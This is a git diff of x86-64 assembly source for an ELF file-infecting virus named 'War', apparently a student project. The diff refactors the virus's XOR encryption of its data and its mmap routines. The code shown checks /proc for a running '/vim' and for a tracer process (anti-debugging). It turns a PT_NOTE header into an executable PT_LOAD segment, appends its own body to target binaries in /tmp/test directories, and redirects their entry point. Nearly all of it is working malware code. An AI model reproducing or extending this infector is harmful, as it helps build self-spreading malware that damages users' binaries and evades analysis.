@@ -76,7 +76,6 @@ section .text
         lea rax, VAR(War.note_phdr_ptr)
         mov rax, [rax]
         mov [rax], dword 0x01                           ; p_type = PT_LOAD
-        ; mov [rax+Elf64_Phdr.p_flags], P_FLAGS               
         mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
         mov ecx, dword VAR(War.file_final_len)
         sub ecx, dword VAR(War.virus_size)
@@ -133,82 +132,69 @@ section .text
         ret
     __F_crazy__end:
 
-    __F_set_unique_trace:
-        push rax
-        push rbx
-        push rcx
-        push rdx
-        push rdi
-        push rsi
-        mov rax, SC_GETTIME
-        mov rdi, 0
-        lea rsi, VAR(War.ts)
-        syscall
-        mov rax, VAR(War.ts)
-        mov rdi, 0x1e9
-        mul rdi
-        xor rcx, rcx
-        lea rdi, [rel Traza + 47]
-        .convert:
-            xor rdx, rdx        ; limpiar rdx
-            mov rbx, 10
-            div rbx             ; rax = rax / 10
-                                ; rdx = resto
-            add dl, '0'         ; convertir a ASCII
-           push rdx            ; guardar dígito en stack
-            inc rcx
-            test rax, rax
-            jnz .convert
-        .write_loop:
-            pop rax
-            mov [rdi], al
-            inc rdi
-            loop .write_loop            
+    __F_encrypt_block:
+        lea r10, [rel __F_data]         ; base función
+        mov rbx, 0x2537683570773774
+        mov rax, 0x0404040404040404
+        xor rbx, rax
 
-        pop rsi
-        pop rdi
-        pop rdx
-        pop rcx
-        pop rbx
-        pop rax
+        xor rcx, rcx                    ; contador función
+        xor rdx, rdx                    ; índice key
+
+        .encrypt_data_loop:
+            mov r8b, [r10 + rcx]
+            mov r9b, bl
+            xor r8b, r9b
+            mov [r10 + rcx], r8b
+
+            ror rbx, 8
+            inc rcx
+            cmp rcx, (__F_data__end - __F_data)
+            jl .encrypt_data_loop
         ret
-    __F_set_unique_trace__end:
+    __F_encrypt_block__end:
+
+    __F_mmap:
+        ; mmap size : original_len + 0x4000. After ftruncate, writes are OK
+        mov eax, dword VAR(War.file_original_len)
+        ; align current size to end at 4K page so our payload is aligned by writing it
+        ; at the end.
+        ALIGN rax
+        mov ecx, dword VAR(War.virus_size)
+        add rax, rcx
+
+        ; save aligned size of file + virus size.
+        mov dword VAR(War.file_final_len), eax
+
+        ; mmap(NULL, file_original_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd_file, 0)
+        mov rdi, 0x0
+        mov rsi, rax
+        mov rdx, PROT_READ | PROT_WRITE
+        mov r10, MAP_SHARED
+        mov r8, VAR(War.fd_file)
+        mov r9, 0x0
+        mov rax, SC_MMAP
+        syscall
+        ret
+    __F_mmap__end:
+
 ; ----------------------------------------------------------------------------------------------------------------------
 
     _init:
 
         PUSH_ALL
         push rsp
-        ; this trick allows us to access war members using the VAR macro
+        ; this trick allows us to access War members using the VAR macro
         mov rbp, rsp
-        sub rbp, War_size            ; allocate war struct on stack
-
-     .decrypt_data:   
-        ; Desencriptar data
-        lea r10, [rel __F_data]         ; base función
-        mov rbx, 0x2537683570773774
-        mov rax, 0x0404040404040404 
-        xor rbx, rax
-        xor rcx, rcx              ; contador función
-        xor rdx, rdx              ; índice key
-
-    .decrypt_data_loop:
-        mov r8b, [r10 + rcx]
-        mov r9b, bl
-        xor r8b, r9b
-        mov [r10 + rcx], r8b
-        
-        ror rbx, 8
-
-        inc rcx
-        cmp rcx, (__F_data__end - __F_data)
-        jl .decrypt_data_loop       
+        sub rbp, War_size            ; allocate War struct on stack
 
         ; load virus size
         lea rax, _start
         lea rbx, _finish
         sub rbx, rax
         mov dword VAR(War.virus_size), ebx
+        
+        CALL_ENCRYPT(encrypt_block) ; desencripta
 
     .open_proc:
         ; open("/proc", O_RDONLY, NULL)
@@ -298,12 +284,12 @@ section .text
         ; esto puede pasar a menudo por permisos. Si sucede, seguimos.
         jle .cleanup_and_check_dir_in_proc
 
-        lea rdi, [forbidden_prog + 3]
+        lea rdi, [forbidden_prog + forbidden_prog_len]
         ; apuntamos con rsi al ultimo caracter de la cadena devuelta por readlink
         CALL_ENCRYPT(crazy)
         add rsi, rax
         dec rsi
-        mov rcx, 4
+        mov rcx, forbidden_prog_len
         std
         rep cmpsb
         ; si está el forbidden program corriendo, saltamos al entrypoint
@@ -319,8 +305,8 @@ section .text
         jmp .jump_to_host
 
     .cleanup_and_check_dir_in_proc:
-        add rsp, 256
-        jmp .check_dir_in_proc
+       add rsp, 256
+       jmp .check_dir_in_proc
 
     .check_tracerpid:
         ; abrimos /proc/self/status
@@ -380,7 +366,8 @@ section .text
         jmp .jump_to_host
 
     .check_tracerPid_value:
-    ; Comentar estas 2 líneas para debug con gdb
+        ; Comentar estas 2 líneas para debug con gdb
+
        cmp byte [rdi], 0x30 ; == "0"
        jne .cleanup_and_jump_to_host_1
 
@@ -512,26 +499,9 @@ section .text
         jmp .close_file
 
     .mmap:
-        ; mmap size : original_len + 0x4000. After ftruncate, writes are OK
-        mov eax, dword VAR(War.file_original_len)
-        ; align current size to end at 4K page so our payload is aligned by writing it
-        ; at the end.
-        ALIGN rax
-        mov ecx, dword VAR(War.virus_size)
-        add rax, rcx
 
-        ; save aligned size of file + virus size.
-        mov dword VAR(War.file_final_len), eax
+        CALL_ENCRYPT(mmap)
 
-        ; mmap(NULL, file_original_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd_file, 0)
-        mov rdi, 0x0
-        mov rsi, rax
-        mov rdx, PROT_READ | PROT_WRITE
-        mov r10, MAP_SHARED
-        mov r8, VAR(War.fd_file)
-        mov r9, 0x0
-        mov rax, SC_MMAP
-        syscall
         test rax, rax
         jle .close_file
         mov VAR(War.mmap_ptr), rax   ; save mmap_ptr
@@ -606,28 +576,9 @@ section .text
 
     .mod_pt_note:
         CALL_ENCRYPT(mod_pt_note)
+        CALL_ENCRYPT(encrypt_block) ; encripta
 
-        CALL_ENCRYPT(set_unique_trace)
         ; Encriptar data
-    .encrypt_data: 
-        lea r10, [rel __F_data]         ; base función
-        mov rbx, 0x2537683570773774
-        mov rax, 0x0404040404040404 
-        xor rbx, rax
-
-        xor rcx, rcx                    ; contador función
-        xor rdx, rdx                    ; índice key
-
-    .encrypt_data_loop:
-        mov r8b, [r10 + rcx]
-        mov r9b, bl
-        xor r8b, r9b
-        mov [r10 + rcx], r8b
-
-        ror rbx, 8
-        inc rcx
-        cmp rcx, (__F_data__end - __F_data)
-        jl .encrypt_data_loop       
     
     .write_payload:
         lea rsi, _start
@@ -651,7 +602,7 @@ section .text
         mov rbx, VAR(War.new_entry)
         mov [rax + Elf64_Ehdr.e_entry], rbx
 
-
+        CALL_ENCRYPT(encrypt_block) ; desencipta
 
     .munmap:
         ;munmap(map_ptr, len)
@@ -706,13 +657,16 @@ section .text
     __F_data:
     tracerPid_str   db      0x54,0x72,0x61,0x63,0x65,0x72,0x50,0x69,0x64,0x3A,0x9  ;"TracerPid:",0x9 ; 11
     status_file     db      0x2F,0x70,0x72,0x6F,0x63,0x2F,0x73,0x65,0x6C,0x66,0x2F,0x73,0x74,0x61,0x74,0x75,0x73,0 ;"/proc/self/status",0 ; 18
-    forbidden_prog  db      0x2F,0x76,0x69,0x6D,0 ;"/vim",0  4
+    forbidden_prog  db      "/vim"
+    forbidden_prog_len equ  $ - forbidden_prog - 1
     exe_string      db      0x2F,0x65,0x78,0x65,0 ;"/exe",0 ; 5
-    proc            db      0x2F,0x70,0x72,0x6F,0x63,0x2f,0 ; "/proc/",0 ; 7
     dirs            db      0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0,0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0x32,0,0  ;"/tmp/test",0,"/tmp/test2",0,0
+    proc            db      0x2F,0x70,0x72,0x6F,0x63,0x2f,0 ; "/proc/",0 ; 7
     __F_data__end:
     Traza_position  equ     _finish - Traza
-    Traza           db      "war version 1.0 (c)oded by tomartin & carce-bo BBBBBBBBBBBB",0  ;46
+    fix_char        db      0
+    Traza           db      "War version 1.0 (c)oded by tomartin & carce-bo",0  ;46
+    Traza_len       equ     $ - Traza - 1
     host_entrypoint dq      _dummy_host_entrypoint
     virus_vaddr     dq      _start
 
